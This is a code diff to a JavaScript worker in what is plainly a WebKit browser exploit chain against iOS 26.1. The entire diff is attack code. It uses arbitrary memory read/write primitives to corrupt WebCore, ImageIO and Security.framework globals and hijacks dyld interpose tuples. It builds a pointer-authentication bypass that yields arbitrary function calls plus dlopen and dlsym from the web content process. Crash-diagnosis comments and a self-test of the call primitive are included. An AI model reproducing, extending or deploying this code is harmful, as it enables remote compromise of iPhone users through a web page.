-    postMessage(`[stage6] softLinkMedia=${hex(initMediaAccessibilityMACaptionAppearanceGetDisplayType)}; read PAL_getPKContactClass`);
+    dumpWorkerStack(worker, 'worker2-post-interpose');   // where is worker2's dlopen parked now?
+    // DUMP the interposingTuplesAll table right after the size store lands: verify OUR 8 tuples are
+    // correctly in RuntimeState for Loader::interpose (compares tuple.replacee [i+1] to the dlsym
+    // address, returns tuple.replacement [i]). If the buffer/layout is wrong, that's why the
+    // globals never become gadgets.
+    {
+        const buf = p.read64(p.p_InterposeTupleAll_buffer);
+        const sz = p.read64(p.p_InterposeTupleAll_size);
+        const a = p.read64(buf), b = p.read64(buf + 8n), c = p.read64(buf + 0x10n), d = p.read64(buf + 0x18n);
+        postMessage(`[diag2] interposeAll buf=${hex(buf)} size=${hex(sz)} | rep[0]=${hex(a)} rep_ee[1]=${hex(b)} rep[2]=${hex(c)} rep_ee[3]=${hex(d)}`);
+    }
+    const softLinkGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
+    const softLinkTextEdge = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle);
+    postMessage(`[stage6] softLinkDisplayType=${hex(softLinkGetDisplayType)} softLinkTextEdge=${hex(softLinkTextEdge)} (want init wrapper 0x1a1056008+slide = battery virgin); read PAL_getPKContactClass`);
     const paciza_PAL_initPKContact = p.read64(offsets.WebCore__PAL_getPKContactClass);
     postMessage(`[stage6] paciza_PAL_initPKContact=${hex(paciza_PAL_initPKContact)}; write PKContact patch`);
-    p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, initMediaAccessibilityMACaptionAppearanceGetDisplayType);
+    // NOTE: the DDDFA slot is NO LONGER patched with the MACaption init wrapper here. The 26.1
+    // detector caller bounds-traps on the wrapper's garbage return (crash 071617). Resolution is
+    // now driven by the page's CAPTION carrier (sign_pointers case); stage7 re-patches the slot
+    // with paciza_security_invoker_1/2 per fcall (26.1 trigger redesign, §5o).
     p.write64(offsets.ImageIO__gImageIOLogProc, paciza_PAL_initPKContact);
     p.write64(offsets.WebCore__initPKContact_once, 0xffffffffffffffffn);
     p.write64(offsets.WebCore__initPKContact_value, 0n);
+    // Force IIOLoadCMPhotoSymbols to re-resolve the CMPhoto globals WITH our tuples installed.
+    // The globals + the TextEdgeStyle init-wrapper once token (0x1eb083d48, ipsw dyld softlinks)
+    // resolved BEFORE the tuples (plain dlsym), so they hold REAL CMPhoto pointers and the
+    // interpose never matched (15:54 symptom). Reset the once token to 0 so the page's CAPTION
+    // carrier (addTextTrack -> caption stylesheet build) makes the init wrapper re-dlsym
+    // MACaptionAppearanceGetTextEdgeStyle -> interpose -> IIOLoadCMPhotoSymbols (NO internal
+    // gate; re-resolves unconditionally), and zero the six gFunc globals so that re-resolution
+    // repopulates them with GADGET addresses (each CMPhoto dlsym interposed: invoker, Security
+    // block_invokes, dlopen, dlsym, signPointer).
+    p.write64(offsets.WebCore__initMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle_once, 0n);
+    for (const g of [offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt,
+                     offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage,
+                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage,
+                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation,
+                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata,
+                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif]) {
+        p.write64(g, 0n);
+    }
     postMessage(`[stage6] posting sign_pointers`);
     self.postMessage({
         type: 'sign_pointers'
@@ -1935,6 +2058,12 @@ async function stage7() {
     postMessage(`paciza_signPointer: ${hex(paciza_signPointer)}`);
     const gSecurityd = new BigUint64Array(0x100 / 8);
     const gSecurityd_data_ptr = gSecurityd.data();
+//NO CRASH HERE
+    // PRESERVE the real securityd ops table before swapping the global: a zeroed table makes
+    // Security.framework's next XPC to securityd dispatch to null and the caller hangs forever
+    // (the stage7-setup FREEZE right after paciza_signPointer, no .ips). Copy all 0x20 ops so
+    // Security/TLS/keychain keep working; slow_fcall only hijacks slots 0x78/0xb8 per call.
+    for (let i = 0n; i < 0x20n; i++) gSecurityd[i] = p.read64(offsets.Security__gSecurityd + i * 8n);
     p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
     const slowFcallResult = new BigUint64Array(0x10 / 8);
     const slowFcallResult_data_ptr = slowFcallResult.data();
@@ -1942,19 +2071,54 @@ async function stage7() {
     p.slowFcallResult = slowFcallResult;
     const invoker_x0 = new BigUint64Array(0x58);
     const invoker_x0_data_ptr = invoker_x0.data();
-    const invoker_arg = new BigUint64Array(0x10);
-    const invoker_arg_data_ptr = invoker_arg.data();
     invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
-    invoker_arg[0 / 8] = paciza_security_invoker_1;
-    invoker_arg[8 / 8] = invoker_x0_data_ptr;
-    p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_arg_data_ptr);
-    p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_invoker);
+    // insurance: if any 26.1 detector path derefs [scanner+0x18] (the old FillInitialContext
+    // null-deref), a self-pointer keeps the reads in-bounds and benign.
+    invoker_x0[0x18 / 8] = invoker_x0_data_ptr;
+
+    // --- 26.1 FCALL TRIGGER (redesigned from the frozen-process diagnosis, §5o) ---
+    // 26.1's TelephoneNumberDetector::find makes ONE call: slot(scannerObj=[0x1eb083f78], span,
+    // len) via blraaz. So the fake scanner IS invoker_x0 and the SLOT is gadget1 (not the 18.6
+    // invoker epilogue — that gadget assumed a 0x70 caller frame; find() has a 0x50 frame and
+    // the call died at its autibsp). Flow: find() -> gadget1(x0=invoker_x0) -> reads x0..x2 from
+    // [invoker_x0+0x28/0x30/0x38] -> blraaz gSecurityd[0x80]=pc -> gadget1's own epilogue stores
+    // the result into slowFcallResult[0] and returns (result!=0) to find() cleanly. No frame
+    // contract, no epilogue gadget.
+    p.write8(offsets.WebCore__TND_supportedFlag, 1n);                          // skip find()'s zeroing path
+    p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);          // once-guard: ready
+    p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);        // fake scanner = invoker_x0
     function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
-        invoker_arg[0 / 8] = paciza_security_invoker_1;
-        gSecurityd[0x78 / 8] = pc;
+        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_1);
+        gSecurityd[0x80 / 8] = pc;   // 23B85: gadget 1 reads gSecurityd[0x80] (was 0x78 on 18.6)
         invoker_x0[0x28 / 8] = x0;
         invoker_x0[0x30 / 8] = x1;
         invoker_x0[0x38 / 8] = x2;
+        // DIAG: is the gSecurityd swap still in effect AT CALL TIME? If the global reverted to the
+        // real table, the gadget reads a real op (or null) and falls back to a securityd XPC that
+        // never answers -> the main-thread HANG. Must be global==ours AND slot==pc for the fast path.
+        const __g = p.read64(offsets.Security__gSecurityd);
+        postMessage(`[fcall] pc=${hex(pc)} global=${hex(__g)} ours=${hex(gSecurityd_data_ptr)} ${__g === gSecurityd_data_ptr ? 'FAST' : 'XPC-FALLBACK!'}`);
+        return new Promise(r => {
+            slow_fcall_resolve = r;
+            self.postMessage({
+                type: 'slow_fcall'
+            });
+            // TIMEOUT: if slow_fcall_done never comes back, resolve with a sentinel so the self-test
+            // can distinguish "call never completed" (sentinel) from "completed with 0/garbage".
+            setTimeout(() => { if (slow_fcall_resolve === r) { slow_fcall_resolve = null; r(0xdeaddeadn); } }, 3000);
+        });
+    }
+    // SAFE NO CRASH
+    // 6-arg variant (gadget2 dispatches gSecurityd[0xc0]; args x0..x5).
+    function slow_fcall_2(pc, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n) {
+        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_2);
+        gSecurityd[0xc0 / 8] = pc;   // 23B85: gadget 2 reads gSecurityd[0xc0] (was 0xb8 on 18.6)
+        invoker_x0[0x28 / 8] = x0;
+        invoker_x0[0x30 / 8] = x1;
+        invoker_x0[0x38 / 8] = x2;
+        invoker_x0[0x40 / 8] = x3;
+        invoker_x0[0x48 / 8] = x4;
+        invoker_x0[0x50 / 8] = x5;
         return new Promise(r => {
             slow_fcall_resolve = r;
             self.postMessage({
@@ -1962,6 +2126,67 @@ async function stage7() {
             });
         });
     }
+    // dlopen/dlsym through the call primitive (makeCString for the name buffers -- no rope dance).
+    function slow_dlopen(filename, flags) {
+        const name = p.makeCString(filename);
+        postMessage("p.makestring: " + filename);
+        return slow_fcall_1(paciza_dlopen, name.ptr, flags);
+    }
+    function slow_dlsym(handle, symbol) {
+        const sym = p.makeCString(symbol);
+        return slow_fcall_1(paciza_dlsym, handle, sym.ptr);
+    }
+    p.slow_fcall_1 = slow_fcall_1; p.slow_fcall_2 = slow_fcall_2;
+    p.slow_dlopen = slow_dlopen; p.slow_dlsym = slow_dlsym;
+
+    // --- fcall self-test: prove the primitive end-to-end with observable, pre-verified results ---
+    // fcall self-test: prove the primitive end-to-end with observable, pre-verified results.
+    // NOTE: the lock-free signPointer probe was REMOVED -- it hangs in the nested detector-scan
+    // context (dyld-internal, not safe to call there). Test slow_dlopen directly (API lock is free).
+    postMessage(`[stage7] setup done; fcall self-test: slow_dlopen libsystem_malloc...`);
+    // liveness instrumentation: if the process dies/hangs mid-self-test, the tick trail shows how
+    // long the WORKER stayed alive after each fcall post (distinguishes "main thread hung in the
+    // fcall" from "whole process died instantly").
+    let __t0 = Date.now();
+    let __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
+    const malloc_handle = await slow_dlopen('/usr/lib/system/libsystem_malloc.dylib', 0n);
+    clearInterval(__tick);
+    postMessage(`[stage7] slow_dlopen(libsystem_malloc) handle=${hex(malloc_handle)} (+${Date.now() - __t0}ms)`);
+    __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
+    const webcore_handle = await slow_dlopen('/System/Library/PrivateFrameworks/WebCore.framework/WebCore', 0n);
+    clearInterval(__tick);
+    postMessage(`[stage7] slow_dlopen(WebCore) handle=${hex(webcore_handle)} (+${Date.now() - __t0}ms)`);
+    __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
+    // PAL_getPKContactClass probe is INFORMATIONAL only: nm on the 23B85 WebCore shows the ONLY
+    // symbol of that name is the softlink DATA slot (S @ 0x1ed61cff8); the function code
+    // (0x19eb92e04, already leaked from that slot = paciza_PAL_initPKContact) is hidden-visibility
+    // PAL statically linked into WebCore, so dlsym CANNOT resolve it (returns 0 by design). The
+    // real dlsym-correctness MATCH uses WebCore-exported symbols with nm-pre-verified addresses
+    // (same proof as malloc, whose dlsym result was bit-exact: unslid 0x18e532040 == T _malloc).
+    const pkc = await slow_dlsym(webcore_handle, 'ZN3PAL17getPKContactClassE');
+    clearInterval(__tick);
+    postMessage(`[stage7] slow_dlsym(PAL_getPKContactClass)=${hex(pkc)} (expect 0: hidden PAL-internal; code ptr already proven = 0x19eb92e04+slide from the softlink global) (+${Date.now() - __t0}ms)`);
+    let __match = false;
+    for (const [sym, want] of [
+        ['ZN3JSC13RuntimeMethod15subspaceForImplERNS_2VME', 0x1a023d3bcn],
+        ['InitWebCoreThreadSystemInterface', 0x1a1256d00n],
+        ['Z41WebCoreObjCScheduleDeallocateOnMainThreadP10objc_classP11objc_object', 0x19fcea378n],
+    ]) {
+        __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
+        const r = await slow_dlsym(webcore_handle, sym);
+        clearInterval(__tick);
+        const unslid = (r & 0xffffffffffn) - p.slide;
+        const ok = unslid === want;
+        __match = __match || ok;
+        postMessage(`[stage7] slow_dlsym(${sym})=${hex(r)} unslid=${hex(unslid)} want=${hex(want)} -> ${ok ? 'MATCH' : 'no'} (+${Date.now() - __t0}ms)`);
+        if (ok) break;
+    }
+    const malloc_sym = await slow_dlsym(malloc_handle, 'malloc');
+    const malloc_unslid = (malloc_sym & 0xffffffffffn) - p.slide;
+    const malloc_ok = malloc_unslid === 0x18e532040n;   // T _malloc, nm-verified on 23B85
+    postMessage(`[stage7] slow_dlsym(malloc)=${hex(malloc_sym)} unslid=${hex(malloc_unslid)} -> ${malloc_ok ? 'MATCH' : 'no'}`);
+    const __ok = malloc_handle !== 0n && webcore_handle !== 0n && __match && malloc_ok;
+    postMessage(`[stage7] fcall self-test ${__ok ? 'PASSED' : 'FAILED -- values above'}`);
 }
 self.onmessage = async function (e) {
     try {
@@ -2037,6 +2262,10 @@ self.onmessage = async function (e) {
             case 'stage7': {
                 // do pac bypass
                 await stage7();
+                break;
+            }
+            case 'slow_fcall_done': {
+                slow_fcall_resolve(p.slowFcallResult[0]);
                 break;
             }
             case 'poll_locks': {
